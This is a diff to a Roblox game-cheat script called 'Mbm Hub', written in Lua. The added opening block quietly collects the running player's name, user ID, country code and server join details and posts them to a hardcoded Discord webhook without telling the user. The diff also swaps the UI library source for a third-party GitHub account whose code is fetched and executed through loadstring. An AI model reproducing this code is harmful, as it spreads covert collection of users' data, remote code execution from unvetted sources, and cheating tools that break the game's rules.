@@ -1,7 +1,76 @@
+local LocalizationService = game:GetService("LocalizationService")
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
+local data = {
+embeds = {
+{
+title = "Profile",
+url = "https://www.roblox.com/users/" .. player.UserId,
+description = "```" .. player.DisplayName .. " (" .. player.Name .. ") ```",
+color = tonumber(322852),
+fields = {
+{
+    name = "country",
+    value = "```Player's country code: " .. code .. "```",
+    inline = true
+},
+{
+    name = "server",
+    value = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```',
+    inline = true
+},
+{
+    name = "ty for using",
+    value = "Main script Mbm Hub (sea 1/2)",
+    inline = true
+}
+}
+}
+}
+}
+
+local jsonData = HttpService:JSONEncode(data)
+local webhookUrl = "https://discord.com/api/webhooks/1212707799079985195/ypm7zbj5mACXZlibJrf4m_NboJBAbb73VYlloNnqVeyHemx7-X-ajORxBza90YCkpxaB"
+local headers = {["Content-Type"] = "application/json"}
+local request = http_request or request or HttpPost or syn.request
+local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}
+
+local success, response = pcall(request, final)
+if success then
+print("+1 User excuted")
+else
+print("Failed to get profile user or excutor: " .. response)
+end
+print("made by minh & dakii")
+print("mbm x hub")
+print("join my discord server : https://dsc.gg/m1m")
+print("bio : https://bio.site/m1m")
+print("ty for using - have fun")
+print("sk (on discord : @player.81 & @dakii_90790)")
+print("wait ,.,")
+print("LCTSV - .,.")  
+--notify
+spawn(function() 
+repeat
+    task.wait()
+until game:IsLoaded()
+repeat
+    task.wait()
+until game.Players
+repeat
+    task.wait()
+until game.Players.LocalPlayer and game.Players.LocalPlayer.Team ~= nil 
+wait(.3)
+require(game.ReplicatedStorage.Notification).new("<Color=Blue> My bio : https://bio.site/m1m <Color=/>"):Display()
+require(game.ReplicatedStorage.Notification).new("<Color=Yellow> My discord server : https://dsc.gg/m1m <Color=/>"):Display()
+require(game.ReplicatedStorage.Notification).new("<Color=Purple> ty for using mbm Hub - have fun:P <Color=/>"):Display()
+end)
 ----------------------------------------------------------------------------------------------------------------------------------------------
-local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
-local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
-local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/heatdeck123/UI-Lib/main/robloxscripts/main%20flunet"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/heatdeck123/UI-Lib/main/robloxscripts/fluent%20save"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/heatdeck123/UI-Lib/main/robloxscripts/fluent%20interface"))()
 ----------------------------------------------------------------------------------------------------------------------------------------------
 local Window = Fluent:CreateWindow({
     Title = "Mbm Hub",
@@ -2472,28 +2541,83 @@ function BTP(p)
 
 --------------------------------------------------------------------------------------------------------------------------------------------
 ---Close UI
-local ToggleUI = Instance.new("ScreenGui")
-local ToggleButton = Instance.new("TextButton")
-local ToggleButtonHUI = Instance.new("UICorner")
-ToggleUI.Name = "ToggleUI"
-ToggleUI.Parent = game.CoreGui
-ToggleUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+local ScreenGui = Instance.new("ScreenGui")
+local ImageButton = Instance.new("ImageButton")
+local UICorner = Instance.new("UICorner")
+local UIGradient = Instance.new("UIGradient")
+local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
 
-ToggleButton.Name = "ToggleButton"
-ToggleButton.Parent = ToggleUI
-ToggleButton.BackgroundColor3 = Color3.fromRGB(30,20,20)
-ToggleButton.BackgroundTransparency = 0.1
-ToggleButton.BorderSizePixel = 0
-ToggleButton.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
-ToggleButton.Size = UDim2.new(0, 50, 0, 50)
-ToggleButton.Font = Enum.Font.SourceSans
-ToggleButton.Text = "Open|Close"
-ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-ToggleButton.TextSize = 14.000
-ToggleButton.Draggable = true
-ToggleButton.MouseButton1Click:Connect(function()
-	game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.End,false,game)
-end)
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+ImageButton.Parent = ScreenGui
+ImageButton.BackgroundColor3 = Color3.fromRGB(124, 124, 124)
+ImageButton.Position = UDim2.new(0.10615778, 0, 0.16217947, 0)
+ImageButton.Size = UDim2.new(0.0627121851, 0, 0.107579626, 0)
+ImageButton.Image = "rbxassetid://16593051889"
+
+UICorner.CornerRadius = UDim.new(0, 15)
+UICorner.Parent = ImageButton
+
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(86, 0, 245)), ColorSequenceKeypoint.new(0.20, Color3.fromRGB(146, 255, 251)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(176, 245, 56)), ColorSequenceKeypoint.new(0.60, Color3.fromRGB(96, 255, 231)), ColorSequenceKeypoint.new(0.80, Color3.fromRGB(247, 147, 25)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(247, 25, 143))}
+UIGradient.Parent = ImageButton
+
+UIAspectRatioConstraint.Parent = ImageButton
+UIAspectRatioConstraint.AspectRatio = 0.988
+
+
+local function HCEGY_fake_script()
+	local script = Instance.new('LocalScript', UIGradient)
+
+	local TweenService = game:GetService("TweenService")
+	local tweeninfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
+	local tween = TweenService:Create(script.Parent, tweeninfo, {Rotation = 360})
+	tween:Play()
+end
+coroutine.wrap(HCEGY_fake_script)()
+local function YTZCAJC_fake_script()
+	local script = Instance.new('LocalScript', ImageButton)
+
+	local UIS = game:GetService('UserInputService')
+	local frame = script.Parent
+	local dragToggle = nil
+	local dragSpeed = 0.25
+	local dragStart = nil
+	local startPos = nil
+	
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+	
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+	
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
+	script.Parent.MouseButton1Click:Connect(function()
+		game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.LeftControl,false,game)
+	end)
+end
+coroutine.wrap(YTZCAJC_fake_script)()
 --------------------------------------------------------------------------------------------------------------------------------------------
 --Remove Effect
 if game:GetService("ReplicatedStorage").Effect.Container:FindFirstChild("Death") then
